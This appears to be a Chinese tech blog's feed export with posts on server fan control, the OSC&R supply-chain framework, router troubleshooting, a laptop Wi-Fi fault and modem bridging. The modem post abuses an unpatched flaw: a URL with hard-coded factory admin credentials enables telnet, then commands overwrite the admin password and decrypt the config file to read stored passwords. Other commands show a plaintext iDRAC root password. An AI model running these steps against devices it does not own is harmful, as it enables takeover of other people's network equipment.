    <tags>
      
      <tag>Work</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dell R730 风扇转速100%</title>
    <link href="/2023/09/04/2023-09-04-dell-r730-limit-fans/"/>
    <url>/2023/09/04/2023-09-04-dell-r730-limit-fans/</url>
    
    <content type="html"><![CDATA[<p>dell R730 风扇转速100%</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>dell r730 服务器安装的两块A2显卡，非dell官方指定的显卡，bios无法获取温度进行主动调速，所以把风扇转速自动调整为100%，部分情况下cpu&#x2F;gpu占用率低下，但是风扇全功率运行，声音一言难尽。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="使用ipmitool手动调速"><a href="#使用ipmitool手动调速" class="headerlink" title="使用ipmitool手动调速"></a>使用ipmitool手动调速</h3><p>ipmitool安装：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">apt <span class="hljs-keyword">install</span> ipmitool<br></code></pre></td></tr></table></figure><p>github地址：<a href="https://github.com/ipmitool/ipmitool">https://github.com/ipmitool/ipmitool</a></p><p>windows下载地址：<a href="https://www.dell.com/support/home/zh-cn/drivers/driversdetails?driverid=m63f3">https://www.dell.com/support/home/zh-cn/drivers/driversdetails?driverid=m63f3</a></p><h3 id="调速"><a href="#调速" class="headerlink" title="调速"></a>调速</h3><p>首先要关闭风扇自动调速功能，否则我们手动设置的转速是不会生效的。最后的0x00表示关闭自动调速，0x01表示开启自动调速。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ipmitool</span> -I lanplus -H <span class="hljs-number">192.168.3.250</span> -U root -P <span class="hljs-number">1</span>qaz@WSX raw <span class="hljs-number">0</span>x30 <span class="hljs-number">0</span>x30 <span class="hljs-number">0</span>x01 <span class="hljs-number">0</span>x00<br></code></pre></td></tr></table></figure><p>关闭自动调速之后，我们就可以按照我们自己的意愿来调整转速了，我这边设置为50%。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ipmitool</span> -I lanplus -H <span class="hljs-number">192.168.3.250</span> -U root -P <span class="hljs-number">1</span>qaz@WSX raw <span class="hljs-number">0</span>x30 <span class="hljs-number">0</span>x30 <span class="hljs-number">0</span>x02 <span class="hljs-number">0</span>xff <span class="hljs-number">0</span>x32<br></code></pre></td></tr></table></figure><p>最后的参数0x32表示转速的百分比的十六进制，0a表示10%，0f表示15%，32表示50%。</p><p><img src="/img/20230904-01.png" alt="DELL BMC "></p><p>通过调整发现，转速确实低了，之前一直稳定在20%-25%（5000+转）左右，功耗大概在170w。通过调低风扇转速，不仅静音了，还降低了功耗。</p><p>需要注意，如果在服务器本地执行的话，不用指定-H参数。</p><p>PS：<br>1、不是永久设置，服务器关闭电源，再次插上电源则需要重新调整。</p><p>2、如果是跑应用，为了防止烧显卡，建议直接100%</p><p>3、配置一下邮件预警，当温度到达一定程度，主动发送邮件，或者放开调速</p><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><h3 id="自动调速"><a href="#自动调速" class="headerlink" title="自动调速"></a>自动调速</h3><h4 id="1、获取CPU温度"><a href="#1、获取CPU温度" class="headerlink" title="1、获取CPU温度"></a>1、获取CPU温度</h4><p>使用sensors工具获取CPU温度，安装命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install lm-sensors<br></code></pre></td></tr></table></figure><p>获取CPU温度命令行如下：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sensors</span> <br></code></pre></td></tr></table></figure><p>也可以直接使用psutil库<br>pip install psutil<br>获取CPU温度，代码参考：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss">import psutil<br><br>def <span class="hljs-built_in">get_cpu_temperature</span>():<br>    cpu_temperature = psutil.<span class="hljs-built_in">sensors_temperatures</span>()[<span class="hljs-string">&#x27;coretemp&#x27;</span>][<span class="hljs-number">0</span>].current<br>    return cpu_temperature<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;CPU Temperature:&quot;</span>, <span class="hljs-built_in">get_cpu_temperature</span>(), <span class="hljs-string">&quot;°C&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="2、获取GPU温度"><a href="#2、获取GPU温度" class="headerlink" title="2、获取GPU温度"></a>2、获取GPU温度</h4><p>这个使用nvidia-smi获取，然后处理一下即可：</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart">nvidia-smi -q -d TEMPERATURE | grep <span class="hljs-string">&#x27;GPU Current Temp&#x27;</span>| awk <span class="hljs-string">&#x27;&#123;print <span class="hljs-subst">$5</span>&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>也可以使用GPUtil库来处理，安装命令：pip install GPUtil</p><p>参考代码：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scss">import GPUtil<br><br>def <span class="hljs-built_in">get_gpu_temperature</span>():<br>    gpus = GPUtil.<span class="hljs-built_in">getGPUs</span>()<br>    gpu_temperature = gpus[<span class="hljs-number">0</span>].temperature<br>    return gpu_temperature<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GPU Temperature:&quot;</span>, <span class="hljs-built_in">get_gpu_temperature</span>(), <span class="hljs-string">&quot;°C&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="自动调速和高温邮件预警"><a href="#自动调速和高温邮件预警" class="headerlink" title="自动调速和高温邮件预警"></a>自动调速和高温邮件预警</h4><p>自动调速和高温邮件预警之类的可以根据以上内容，自行开发了，根据CPU和GPU温度实时调速，一定注意，GPU和CPU温度需要同时进行判断，由于服务器GPU上无风扇，只能被动散热，如果调整不当，容易烧显卡。</p><h2 id="错误："><a href="#错误：" class="headerlink" title="错误："></a>错误：</h2><h3 id="Error-Unable-to-establish-IPMI-v2-x2F-RMCP-session"><a href="#Error-Unable-to-establish-IPMI-v2-x2F-RMCP-session" class="headerlink" title="Error: Unable to establish IPMI v2 &#x2F; RMCP+ session"></a>Error: Unable to establish IPMI v2 &#x2F; RMCP+ session</h3><h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><p>1、用户名或者密码错误</p><p>2、未启用ipml</p><h4 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h4><p>1、设置密码：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs smali">Menu Overview -&gt; IDRAC SETTINGS -&gt; User Authentication<br>-&gt; Click on the userID of your admin account -&gt; Next<br>-&gt;<span class="hljs-built_in"> check </span><span class="hljs-string">&quot;change your password&quot;</span> checkbox<span class="hljs-built_in"> and </span>enter the same (or new) password<br>-&gt; Apply<br></code></pre></td></tr></table></figure><p>2、启动ipml<br><img src="/img/20230904-02.png" alt="DELL BMC "><br>测试命令：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">ipmitool -<span class="hljs-selector-tag">I</span> lanplus -H <span class="hljs-number">192.168</span>.<span class="hljs-number">3.250</span> -U root -<span class="hljs-selector-tag">P</span> <span class="hljs-number">1</span>qaz<span class="hljs-keyword">@WSX</span> power status<br></code></pre></td></tr></table></figure><p><img src="/img/20230904-03.png" alt="ipml test "></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://stackoverflow.com/questions/51948745/error-unable-to-establish-ipmi-v2-rmcp-session">https://stackoverflow.com/questions/51948745/error-unable-to-establish-ipmi-v2-rmcp-session</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OSC&amp;R：针对软件供应链的 ATT&amp;CK 框架</title>
    <link href="/2023/08/08/2023-08-08-oscr/"/>
    <url>/2023/08/08/2023-08-08-oscr/</url>
    
    <content type="html"><![CDATA[<p>OSC&amp;R：针对软件供应链的 ATT&amp;CK 框架</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>多年来，供应链攻击一直被视为一项严重的安全隐患。但是，供应链的攻击由于其攻击难度高，见效慢等特征，以及防守方侥幸心理，一直不受重视。近年来，整个社会似乎面临着更多、更有组织的攻击浪潮。这可能是因为监管要求，各单位或多或少增加了安全防护措施，通过演练等场景，整体提高了企业安全能力，这就迫使攻击者转而寻找其他突破口，而供应链便成为了他们攻击的目标。又可能是因为供应链比较重要，是因为一旦攻击成功，大量依赖受影响供应商产品的客户也将难逃其影响。因此，一次单一攻击可能引发连锁反应，造成广泛的传播影响。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>OSC&amp;R是一个开放式框架，为广大安全人员提供了一个综合、系统化且可操作的方法论，以深入了解攻击者的行为和技术手段。与MITRE ATT&amp;CK类似，OSC&amp;R按照攻击者所采用的战术、技术和过程（TTP）将其有条不紊地组织成清晰且结构化的视角。然而，OSC&amp;R独辟蹊径，成为了第一个也是唯一一个专注于软件供应链的攻击矩阵。该框架覆盖了广泛的攻击向量，包括第三方库和组件中的漏洞、涉及构建和部署系统的供应链攻击，以及受感染或被植入恶意代码的软件更新。</p><p>安全团队可以运用OSC&amp;R框架来评估现有的供应链防御措施，准确定位哪些供应链威胁需要优先应对，并且审视现有的防御措施如何应对这些威胁。同时，该框架还协助监测和追踪攻击者组织的攻击行为，为安全人员提供行动的重要洞察。<br><img src="/img/20230808-01.png" alt="Open Software Supply ChainAttack Reference (OSC&amp;R)"></p><p><img src="/img/20230808-02.png" alt="OSC&amp;R 中文"></p><p>注意：</p><ul><li>1、以下为本人翻译内容，部分翻译可能存在歧义   </li><li>2、OSC&amp;R随着时间发展，内容会发生变动  </li><li>3、翻译时间为2023年8月8日</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="1-OSC-amp-R-满足了软件供应链领域对ATT-amp-CK-安全框架的迫切需求"><a href="#1-OSC-amp-R-满足了软件供应链领域对ATT-amp-CK-安全框架的迫切需求" class="headerlink" title="1.OSC&amp;R 满足了软件供应链领域对ATT&amp;CK 安全框架的迫切需求"></a>1.OSC&amp;R 满足了软件供应链领域对ATT&amp;CK 安全框架的迫切需求</h3><p>为安全社区提供了一个统一的参考框架，可以帮助企业主动评估自身的软件供应链安全策略，并进行解决方案选型，从而制定有效的供应链安全策略。</p><h3 id="2-OSC-amp-R框架重点侧重软件供应链的攻击战法"><a href="#2-OSC-amp-R框架重点侧重软件供应链的攻击战法" class="headerlink" title="2.OSC&amp;R框架重点侧重软件供应链的攻击战法"></a>2.OSC&amp;R框架重点侧重软件供应链的攻击战法</h3><p>与MITTRE ATT&amp;CK一样，OSC&amp;R 也是按照攻击者使用的战术、技术和步骤(TTPs)来组织排列的，旨在提供一种通用的语言和结构，以帮助人们理解和分析攻击者用来攻击软件供应链的TTPS。它涵盖了大量的攻击向量，包括第三方库和组件的漏洞、构建和部署系统的供应链，以及恶意软件更新等。</p><p>安全团队可以使用 OSC&amp;R 框架来评估现有的防御措施，确定哪些威胁需要优先处理、现有的覆盖范围是否可以解决这些威胁，并在其帮助下跟踪攻击组红的攻击行为。随着新战术和技术的出现和发展，OSC&amp;R 框架会定期更新。该框架也可以用于设定渗透测试和红队演习时所需的范围，并且，由于可以充当测试中和测试后的记分卡，它还可以促进红队评估行为的顺利开展。</p><h3 id="3-软件供应链安全依然是任重道远"><a href="#3-软件供应链安全依然是任重道远" class="headerlink" title="3.软件供应链安全依然是任重道远"></a>3.软件供应链安全依然是任重道远</h3><p>软件供应链相关数据泄露和风险持续影响全球组织机构，因此，软件供应钱安全仍旧是各家企业和安全行业的头等大事。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://pbom.dev/">https://pbom.dev/</a>【osc&amp;r】</li><li><a href="https://github.com/pbom-dev/OSCAR">https://github.com/pbom-dev/OSCAR</a>【osc&amp;r github】</li><li>att&amp;ck框架实践指南</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Software Supply Chain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>H3C GR3200无法自动加载AP</title>
    <link href="/2023/07/04/2023-06-13-h3c-gr3200-can-not-find-a51/"/>
    <url>/2023/07/04/2023-06-13-h3c-gr3200-can-not-find-a51/</url>
    
    <content type="html"><![CDATA[<p>H3C GR3200无法自动加载AP</p><hr><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>7月断电重启后，AP无法上线，修改网段也是无法上线，解决方法是新增一个vlan，AP单独走一个VLAN，这次没法判断问题原因了，反正能用，有线和AP两个网段，也可以相互访问，就是需要在两个vlan中都要配置DHCP，要不AP无法获取IP地址。<br>这个方法比较差劲，但是能用，如果实在搞不定，找H3C客服协助吧。</p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>公司网络是一台H3C GR3200充当主路由同时也充当AC，通过poe交换机管理4个AP，最近网络一直不稳定，AP时断时续，也是尴尬，上次找网络实施的厂商过来处理了一下，小伙子折腾了一下午，重新刷新了固件也没解决，后来没办法了，将其中一个AP做成胖AP，大家可以将就上网，行政同学让我们确定一下问题，如果出故障了，直接更换就行，由于无法判断是AC出问题还是AP出问题，这件事暂时搁置，这周一，网络用的实在难受，毛遂自荐，让行政下单买了个POE交换，换上去，不幸的是，AC上依然获取不到，尴尬的我能扣出一室三厅。</p><h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><p>路由器上的日志显示，会有AP的报文，AC会给AP自动分配一个ip地址，地址是172.18.1.xx，但是长时间等待，在线AP列表中仍然加载不出来，这就搞笑了，加载不出来，AP相当于无法被AC接管，也就没法启动AP和下发配置。<br>尝试的方法包括：<br>1、将AP恢复出厂设置。<br>2、路由器固件升级到最新。<br>在这个过程中，出现一个玄学的问题，有时候AP会上线，这就尴尬了，感觉可能是poe交换机出现问题，重新更换新的POE交换机，并没有解决，现象照旧。</p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>在知了社区查找原因，发现有网友也遇到了同样的问题，但是没解决，今天翻帖子，发现有一个帖子是《M20系列产品Mini AP注册及无线配置方法》，这个帖子和我们当前的环境无关，但是有个好玩的事就是帖子最后的配置注意事项引起了我的关注。</p><blockquote><p>配置关键点4<br>注意事项<br>   1.当 M20 升级成R004 或更高版本后，R002 及以前版本的AP 上线后获取到的是172.18.1.0网段的地址，请确保网络中的地址及M20 分配地址池与此网段不冲突。<br>   2.当 AP 为R003 或更高版本时，M20 版本需升级到R004 及以后版本，否则不能管理AP。建议将AP 和M20 都升级到最新版本再使用。<br>   3.M20 在升级成R004版本之前，请确保地址池不包含172.18.1.0&#x2F;24 和192.168.1.0&#x2F;24 网段，否则升级后地址池会与预留的172.18.1.0&#x2F;24 和192.168.1.0&#x2F;24 &gt; 网段冲突，导致AP 无法上线。</p></blockquote><p>R004版本后，会与默认的地址池冲突，导致AP无法上线，虽说我们用的AP为mini AP-51，可能存在同样的问题。<br>在AC上修改了AP地址池为：172.19.1.0&#x2F;24，剩余3个AP秒上线，真是日了狗了，这种bug，要不解决一下，要不在升级文档里面着重说明一下，真是坑爹。<br><img src="/img/20230613-01.png" alt="h3c gr3200配置"></p><p><img src="/img/20230613-02.png" alt="h3c gr3200 AP自动上线 "></p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><ul><li><a href="https://zhiliao.h3c.com/Theme/details/45618">https://zhiliao.h3c.com/Theme/details/45618</a>【M20系列产品Mini AP注册及无线配置方法】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Iot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>华硕ROG G15无线网卡原因导致系统不定时蓝屏，网卡不定时下线问题</title>
    <link href="/2023/07/04/2023-07-04-resolve-asus-rog-zephyrus-g15-wireless-error/"/>
    <url>/2023/07/04/2023-07-04-resolve-asus-rog-zephyrus-g15-wireless-error/</url>
    
    <content type="html"><![CDATA[<p>华硕ROG G15无线网卡原因导致系统不定时蓝屏，网卡不定时下线问题</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>首先吐槽一下华硕售后，服务相当拉跨，遇到问题，问就是自行去售后网点，对于G15这款笔记本，如果稳定性做不好，就暂缓上市，或者认真解决问题，到目前，买这个破本两年多了，快一年了没有收到任何驱动更新通知，佐证来源于下图：<br><img src="/img/20230704-01.png" alt="华硕管家更新历史"></p><p>除了键盘固件更新，核心也就是vbios更新，而且仅限于21年，其他驱动压根没有，键盘固件有个毛用。<br><img src="/img/20230704-02.png" alt="华硕管家更新历史"></p><p>可能华硕比较对自己家的产品比较自信，再自信，好歹是性能本，打游戏得跟上老黄驱动更新，你这驱动都是2年前的，先不说是否支持最新的3A大作，好歹跟上老黄更新的节奏，而不是让玩家每次通过其他渠道去更新驱动。给我的感觉就是花了大价钱入了败家系列，还得忍受华硕拉跨的售后。</p><h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><p>现象：无线网卡不定时掉线，如下图：<br><img src="/img/20230704-03.png" alt="华硕rog15 无线网卡掉线"></p><p><img src="/img/20230704-04.png" alt="华硕rog15 无线网卡掉线"></p><p><img src="/img/20230704-05.png" alt="华硕rog15 无线网卡掉线"></p><p>重启有50%可能性恢复，遇到这个问题，刚开始准备一个外置的USB无线网卡，突然掉线，还能用无线网卡救急，但是突然蓝屏，资料没保存，这就难受了，想骂街。<br><img src="/img/20230704-06.jpg" alt="华硕rog15 无线网卡掉线蓝屏"></p><p><img src="/img/20230704-07.jpg" alt="华硕rog15 无线网卡掉线蓝屏"></p><h2 id="解决历程："><a href="#解决历程：" class="headerlink" title="解决历程："></a>解决历程：</h2><p>1、华硕管家显示驱动都是最新的，联系客服后，重新安装网卡驱动，重新安装过后重启，有50%一定的概率能识别，也可能没什么用，请假准备去售后服务点，出门前发现又好了，离谱他妈给离谱开门，离谱到家了，这种无法复现的问题，估计售后也无法解决，遂作罢<br>2、隔了一周又遇到同样的问题，网上发现可以强制关机，然后重启，网卡上线，这，无语了。<br>3、某日无聊，发现联想的一篇帖子《关于R9000P 无线网卡，经常断线，信号消失》，在评论区看到网友评价：MediaTek Wi-Fi 6 MT7921，这个沙雕网卡，原厂驱动之前经常掉卡，重启也不好使，要拔掉电源才行，遂入手一个AX210，一年多了，也没遇到掉线蓝屏的问题。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1、华硕沙雕售后，对于这种严重影响用户使用体验的问题，是否重视一下，通过售后服务点更新新的网卡或者更新定制化驱动来处理这个问题，这款G15主打性能设计本，我估计那些用G15搞设计的师傅们望着突然蓝屏的笔记本杀人的心都有了，不定时掉线和蓝屏真的很烦。<br>2、其他网友遇到类似的问题，建议直接更换网卡，我反正没耐心去等华硕改正了，估计等不到。<br>3、对于笔记本产品，尤其是商务办公，建议还是无脑小黑或者傻戴尔。</p><ul><li>以上均为个人观点，不喜勿喷。</li></ul><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><ul><li><a href="https://bbs.thinkpad.com/thread-7830669-1-1.html">https://bbs.thinkpad.com/thread-7830669-1-1.html</a>【关于R9000P 无线网卡，经常断线，信号消失】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Iot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>中国移动光猫h5-9家庭网关重置管理员密码并桥接网络</title>
    <link href="/2022/12/25/2022-12-25-china-mobile-family-gateway-crack/"/>
    <url>/2022/12/25/2022-12-25-china-mobile-family-gateway-crack/</url>
    
    <content type="html"><![CDATA[<p>中国移动光猫h5-9家庭网关重置管理员密码并桥接网络</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>首先吐槽一下中国移动的宽带服务，这里基于帝都其他省份未知，对比联通而言，联通资费较贵，每个月资费大概比移动贵三四十元，但是网络稳定，访问国际网络较为流畅，并且可以获取公网ipv4&#x2F;ipv6地址，这点相当给力，并且套餐比较灵活，随用随开，随走随停，反观移动，如果使用移动赠送的宽带，会有每个月75的最低消费限制，并且强制要求在网两年，如果使用正常资费的宽带，价格对比联通略微便宜，但是安装费用跑不了，无公网ipv4，但是支持ipv6,对于一个搞IT，这点就很难受，也挺恶心，想换网，还得再忍受两年垃圾带宽。之前提供的移动光猫只给了user密码，无管理员密码，联系客服和安装师傅无果后，只能用软路由做二级路由进行管理，期间也尝试使用网上爆出的超级管理员用户名和密码进行测试，均失败，终于通过一个未修复的漏洞，成功重置了管理员密码，破解方案参考网友enihsyou，并进行了光猫桥接，访问米国测速站点，成功将300+ms的ping值降到300ms以下，这里记录一下，方便其他网友参考。<br>这里不得不再吐槽一下，这个光猫厂家可能给电信也做过，电信的界面和相关功能也没删除，测试的时候给调试出来了，看着天翼的logo当场懵逼。</p><h2 id="获取光猫管理员密码"><a href="#获取光猫管理员密码" class="headerlink" title="获取光猫管理员密码"></a>获取光猫管理员密码</h2><h3 id="启动telnet"><a href="#启动telnet" class="headerlink" title="启动telnet"></a>启动telnet</h3><p>1、访问192.168.3.1，默认用户名为user，密码如果没修改，自行查阅光猫背后的密码进行登录<br><img src="/img/20221225-01.png" alt="光猫信息"><br>2、在当前页面地址栏输入 <code>http://192.168.1.1/usr=CMCCAdmin&amp;psw=aDm8H%25MdA&amp;cmd=1&amp;telnet.gch</code> 点开启telnet，点保存<br>3、使用telnet并用 <code>telnet 192.168.1.1</code> 配合用户名 <code>CMCCAdmin</code> 密码 <code>aDm8H%MdA</code> 登录<br><img src="/img/20221225-02.png" alt="telnet"> </p><h3 id="重置下发的CMCCAdmin管理员密码"><a href="#重置下发的CMCCAdmin管理员密码" class="headerlink" title="重置下发的CMCCAdmin管理员密码"></a>重置下发的CMCCAdmin管理员密码</h3><p>再输入 <code>su</code> ，密码为user的密码，切换到超级用户,输入以下代码覆盖下发的超级用户用户名和密码（其实只要密码的部分就够了）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sidbg 1 DB set DevAuthInfo 0 User CMCCAdmin<br>sidbg 1 DB set DevAuthInfo 0 Pass aDm8H%MdA<br></code></pre></td></tr></table></figure><p>会回显带<code>*</code>的XML，无视它，密码已经修改成功了，直接去192.168.1.1使用用户名 <code>CMCCAdmin</code> 密码 <code>aDm8H%MdA</code> 进行登录。<br><img src="/img/20221225-03.png" alt="密码重置"> </p><p>另外可以直接解密看原文</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sidbg 1 DB decry /userconfig/cfg/db_user_cfg.xml<br>grep Password /tmp/debug-decry-cfg<br></code></pre></td></tr></table></figure><h2 id="光猫桥接"><a href="#光猫桥接" class="headerlink" title="光猫桥接"></a>光猫桥接</h2><p>我们在网络菜单中，找到网络配置，记录一下vlan id，<br><img src="/img/20221225-04.png" alt="光猫PPPOE默认配置"> </p><p>光猫桥接配置如下：</p><p>修改完成点击保存即可，这里需要注意，光猫桥接以后，就无法通过二级路由进行访问光猫的管理界面，这点需要注意，一定确认好再保存，这里需要绑定光猫的lan1口，可以通过其他lan口管理光猫。</p><h2 id="openwrt-配置"><a href="#openwrt-配置" class="headerlink" title="openwrt 配置"></a>openwrt 配置</h2><p>之前配置openwrt为二级路由，这里需要重新配置，我这里就不在网页上配置了，直接修改配置文件，其中需要注意，默认固件中会有一个wan接口，还有一个wan6，方便ipv4和ipv6管理，但是如果使用pppoe进行桥接拨号，会生成一个wan_6的虚拟动态接口，这里冲突了，需要将WAN6移除。<br>网络配置如下，修改 <code>/etc/config/network </code>:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">config interface <span class="hljs-string">&#x27;lan&#x27;</span><br>        <span class="hljs-selector-tag">option</span> device <span class="hljs-string">&#x27;br-lan&#x27;</span><br>        <span class="hljs-selector-tag">option</span> proto <span class="hljs-string">&#x27;static&#x27;</span><br>        <span class="hljs-selector-tag">option</span> ipaddr <span class="hljs-string">&#x27;192.168.3.1&#x27;</span><br>        <span class="hljs-selector-tag">option</span> netmask <span class="hljs-string">&#x27;255.255.255.0&#x27;</span><br>        <span class="hljs-selector-tag">option</span> ip6assign <span class="hljs-string">&#x27;64&#x27;</span><br><br>config interface <span class="hljs-string">&#x27;wan&#x27;</span><br>        <span class="hljs-selector-tag">option</span> device <span class="hljs-string">&#x27;eth1&#x27;</span><br>        <span class="hljs-selector-tag">option</span> proto <span class="hljs-string">&#x27;pppoe&#x27;</span><br>        <span class="hljs-selector-tag">option</span> username <span class="hljs-string">&#x27;xxxxx&#x27;</span><br>        <span class="hljs-selector-tag">option</span> password <span class="hljs-string">&#x27;xxxxx&#x27;</span><br>        <span class="hljs-selector-tag">option</span> ipv6 <span class="hljs-string">&#x27;auto&#x27;</span><br></code></pre></td></tr></table></figure><p>DHCP配置如下，修改<code> /etc/config/dhcp</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus">config dhcp <span class="hljs-string">&#x27;lan&#x27;</span><br>        <span class="hljs-selector-tag">option</span> interface <span class="hljs-string">&#x27;lan&#x27;</span><br>        <span class="hljs-selector-tag">option</span> start <span class="hljs-string">&#x27;100&#x27;</span><br>        <span class="hljs-selector-tag">option</span> limit <span class="hljs-string">&#x27;150&#x27;</span><br>        <span class="hljs-selector-tag">option</span> ra_management <span class="hljs-string">&#x27;1&#x27;</span><br>        list dhcp_option <span class="hljs-string">&#x27;6,192.168.3.1,223.5.5.5&#x27;</span><br>        <span class="hljs-selector-tag">option</span> leasetime <span class="hljs-string">&#x27;12h&#x27;</span><br>        <span class="hljs-selector-tag">option</span> ra <span class="hljs-string">&#x27;server&#x27;</span><br>        <span class="hljs-selector-tag">option</span> dhcpv6 <span class="hljs-string">&#x27;server&#x27;</span><br><br>config dhcp <span class="hljs-string">&#x27;wan&#x27;</span><br>        <span class="hljs-selector-tag">option</span> interface <span class="hljs-string">&#x27;wan&#x27;</span><br>        <span class="hljs-selector-tag">option</span> ignore <span class="hljs-string">&#x27;1&#x27;</span><br>        <span class="hljs-selector-tag">option</span> start <span class="hljs-string">&#x27;100&#x27;</span><br>        <span class="hljs-selector-tag">option</span> limit <span class="hljs-string">&#x27;150&#x27;</span><br>        <span class="hljs-selector-tag">option</span> leasetime <span class="hljs-string">&#x27;12h&#x27;</span><br></code></pre></td></tr></table></figure><p>DHCP修改，主要是为了配置ipv6相关内容，ipv4使用默认配置即可，这里配置ipv6的ra,dhcp为服务器模式，禁用NDP。使用以下命令重启网络：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-regexp">/etc/</span><span class="hljs-keyword">init</span>.d<span class="hljs-operator">/</span>network restart<br></code></pre></td></tr></table></figure><p>自此，光猫桥接和ipv6的配置已完成，所有设备可以获取到ipv6地址，可以使用：<a href="https://test-ipv6.com/">https://test-ipv6.com/</a> 和<a href="https://ipw.cn/%E6%9D%A5%E6%B5%8B%E8%AF%95%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E4%BD%BF%E7%94%A8%E4%BB%A5%E4%B8%8B%E5%91%BD%E4%BB%A4%EF%BC%9A%60%60%60curl">https://ipw.cn/来测试，也可以使用使用以下命令：```curl</a> ipv6.ip.sb &#96;&#96;&#96;，看是否可以获取到ipv6地址，或者直接ping。</p><p>需要注意，如果只能单向ping通，通常是防火墙禁止转发，目前只能调通icmp相关规则<br><img src="/img/20221225-05.png" alt="禁止ipv6 ping 防火墙规则"><br>启用以后就会无法从公网进行ping，ping的结果为：Destination unreachable: Port unreachable   </p><p><img src="/img/20221225-06.png" alt="禁止ipv6 ping "> 